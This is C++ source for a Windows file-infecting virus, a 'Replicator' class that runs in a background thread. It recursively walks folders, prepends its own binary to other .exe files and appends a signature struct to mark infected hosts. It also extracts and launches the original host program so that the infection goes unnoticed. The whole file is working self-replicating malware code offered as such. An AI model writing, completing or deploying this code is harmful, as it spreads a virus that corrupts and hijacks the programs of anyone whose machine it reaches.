#include <fstream>
#include <time.h>

#include "Replicator.h"
#include "Definitions.h"

// tymczasowe do testow
#include <iostream>

using namespace std;

DWORD WINAPI Run(LPVOID lpParam)
{
    Replicator *replicator = ((Replicator*)lpParam);

    char* infectPath = "C:\\Temp";

    while(replicator->CanInfect())
    {
        if(replicator->CheckInfected(infectPath) == true)
        {
            replicator->Extract();
            replicator->InfectFolder2(infectPath);
        }
        else
        {
            replicator->InfectFolder(infectPath);
        }
        Sleep(1000);
    }

    return 0;
}


Replicator::Replicator()
{
    ThreadHandle = 0;
    canInfect = false;
}

void Replicator::Start()
{
    ThreadHandle = CreateThread( NULL, 0, Run, this, 0, NULL);
    canInfect = true;
}

void Replicator::Stop()
{
    canInfect = false;
    WaitForMultipleObjects(1, &ThreadHandle, TRUE, INFINITE);
    CloseHandle(ThreadHandle);
}

bool Replicator::CanInfect() { return canInfect; }

void Replicator::Infect(char*dest)
{
    char * temp_file = GetTempFile();
	ofstream virus(temp_file, ios::binary);

	char * source_file = LoadFileIntoRam(AppPath());
	char * dest_file = LoadFileIntoRam(dest);

	Hack.file_size = GetFileSize(dest);
	strcpy(Hack.firma, virus_sig);

	virus.write(source_file, GetFileSize(AppPath()));
	virus.write(dest_file, GetFileSize(dest));
	virus.write((const char*)&Hack, sizeof(Hack_Struct));
	virus.close();

	delete [] source_file;
	delete [] dest_file;

	CopyFile(temp_file,dest,false);
}

DWORD Replicator::GetFileSize(char *path)
{
	WIN32_FIND_DATA fd;
	FindFirstFile(path,&fd);
	return fd.nFileSizeLow;
}

char* Replicator::LoadFileIntoRam(char *path)
{
	ifstream f (path,ios::binary);
	if(!f) return (char*)NULL;

	char * fileram = (char *)malloc(GetFileSize(path));
	char ch;
	int pos=0;

	while(f.get(ch))
	{
		fileram[pos] = ch;
		pos++;
	}

	return fileram;
}

char* Replicator::CasualName()
{
	srand(time(NULL));
    char *o = "abcdefghjiklmnopqrstuvwxyz1234567890";
	int i;
	int c;
	char*nome = new char[10];

	for (i=0;i<10;i++)
    {
		c = rand()%36;
		nome[i] = o[c];
    }

    return nome;
}

char* Replicator::GetTempFile()
{
	char wintemp_path[1024];
	char *temp_path=new char[1024];
	GetTempPath(1024,wintemp_path);
	char*temp_virus=CasualName();
	GetTempFileName(wintemp_path,temp_virus,1234,temp_path);

	return temp_path;
}

char* Replicator::AppPath()
{
    char*path;
    path = (char*)malloc(1024);
    HINSTANCE i = GetModuleHandle(NULL);
    GetModuleFileName(i,path,1024);

    return path;
}

bool Replicator::CheckInfected(char*path)
{
    //check if an exe is infected
    ifstream ch(path,ios::binary);
    ch.seekg(GetFileSize(path)-sizeof(Hack_Struct),ios::beg);
    Hack_Struct *p = new Hack_Struct;
	ch.read((char*)p,sizeof(Hack_Struct));
	ch.close();

	if (!strcmp(p->firma,virus_sig))
    {
        return true;
    }

    return false;
}

void Replicator::Extract()
{
    //take the orginal exe out of the "box", put it in a temporary file and launch it
    ifstream io(AppPath(),ios::binary);
    io.seekg(GetFileSize(AppPath())-sizeof(Hack_Struct));
    Hack_Struct *l = new Hack_Struct;
    io.read((char*)l,sizeof(Hack_Struct));
    char * infect_file_data = new char[l->file_size];
    io.seekg(GetFileSize(AppPath())-l->file_size-sizeof(Hack_Struct),ios::beg);
    io.read(infect_file_data,l->file_size+sizeof(Hack_Struct));
    io.close();
    char * infect_file_path = GetTempFile();
    ofstream fout(infect_file_path,ios::binary);
	fout.write(infect_file_data,l->file_size);
	fout.close();

	WinExec(infect_file_path,SW_NORMAL);

	delete l;
	delete [] infect_file_data;
    delete [] infect_file_path;

}

char* Replicator::GetMyPath()
{
    char* szCurDir= new char [MAX_PATH];
    GetCurrentDirectory(MAX_PATH, szCurDir);

    return (char*)szCurDir;
}

void Replicator::InfectFolder(char*path)
{
	 WIN32_FIND_DATA df;
	 HANDLE hFind;
	 char p2[2048];
	 char p3[2048];
	 strcpy(p2,path);
	 strcpy(p3,path);
	 strcat(p2, "\\*.*");
	 hFind = FindFirstFile(p2, &df);
	 strcat(p3, "\\");
	 strcat(p3,df.cFileName);
	 if (df.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
						 if ((!strcmp(df.cFileName,"."))||(!strcmp(df.cFileName,".."))){}else{
												InfectFolder(p3);
						 }
	 }else{
	 string p(df.cFileName);
	   if (!strcmp(GetText(p).c_str(),"exe")){
		  if (CheckInfected(p3) == false){
		  Infect(p3);
		  }
	   }
	 }
	 do{
	 char p1[2048];
	 strcpy(p1,path);
	 strcat(p1, "\\");
	 strcat(p1,df.cFileName);
	 if (df.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
						 if ((!strcmp(df.cFileName,"."))||(!strcmp(df.cFileName,".."))){}else{
												InfectFolder(p1);
						 }
						 }else{
							   string p(df.cFileName);
							   if (CheckInfected(p1) == false){
										 //if(Infect(p1)){
										 //}
										 Infect(p1);
							   }
						 }
	 }while(FindNextFile(hFind,&df)!=0);

	 FindClose(hFind);
}

int Replicator::Infect2(char*dest){  //this infection starts from an infected exe, so we need to read the struct at the end so to extract the VIRUS
   ifstream io(AppPath(),ios::binary);
   io.seekg(GetFileSize(AppPath())-sizeof(Hack_Struct));
   Hack_Struct *l = new Hack_Struct;
   io.read((char*)l,sizeof(Hack_Struct));
   char * infect_file_data = new char[GetFileSize(AppPath())-l->file_size-sizeof(Hack_Struct)];
   io.seekg(0);
   io.read(infect_file_data,GetFileSize(AppPath())-l->file_size-sizeof(Hack_Struct));
   io.close();
   char * temp_file =GetTempFile();
   ofstream virus(temp_file,ios::binary);

	char * dest_file = LoadFileIntoRam(dest);

	Hack.file_size = GetFileSize(dest);
	strcpy(Hack.firma,virus_sig);

	virus.write(infect_file_data,GetFileSize(AppPath())-l->file_size-sizeof(Hack_Struct));
	virus.write(dest_file,GetFileSize(dest));
	virus.write((const char*)&Hack,sizeof(Hack_Struct));
	virus.close();
	delete [] infect_file_data;
	delete [] dest_file;
	if(!CopyFile(temp_file,dest,false)){
	return 0;
	}else{
	return 1;
	}
}

string Replicator::GetText(string path){
path.erase(path.begin(),path.end()-3);
return path;
}

void Replicator::InfectFolder2(char*path){
   WIN32_FIND_DATA df;
   HANDLE hFind;
   char p2[2048];
   char p3[2048];
   char p[2048];
   strcpy(p,path);
   strcpy(p2,path);
   strcpy(p3,path);
   strcat(p2, "\\*.*");
   hFind = FindFirstFile(p2, &df);
   strcat(p3, "\\");
   strcat(p3,df.cFileName);
   if (df.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
						 if ((!strcmp(df.cFileName,"."))||(!strcmp(df.cFileName,".."))){}else{
											   InfectFolder2(p3);
						 }
   }else{
				 string p(df.cFileName);
				 if (!strcmp(GetText(p).c_str(),"exe")){
							   if (CheckInfected(p3) == false){
							   Infect(p3);
							   }
				 }
   }
   do{
	   char p1[2048];
	   strcpy(p1, path);
	   strcat(p1, "\\");
	   strcat(p1,df.cFileName);
	   if ((!strcmp(df.cFileName,"."))||(!strcmp(df.cFileName,".."))){}else{
						 if (df.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
						 InfectFolder2(p1);
						 }else{
							   string p(df.cFileName);
							   if (!strcmp(GetText(p).c_str(),"exe")){
									if (CheckInfected(p1) == false){
									Infect2(p1);
									}
							   }
						 }
	   }

   }while(FindNextFile(hFind,&df)!=0);

   FindClose(hFind);

}
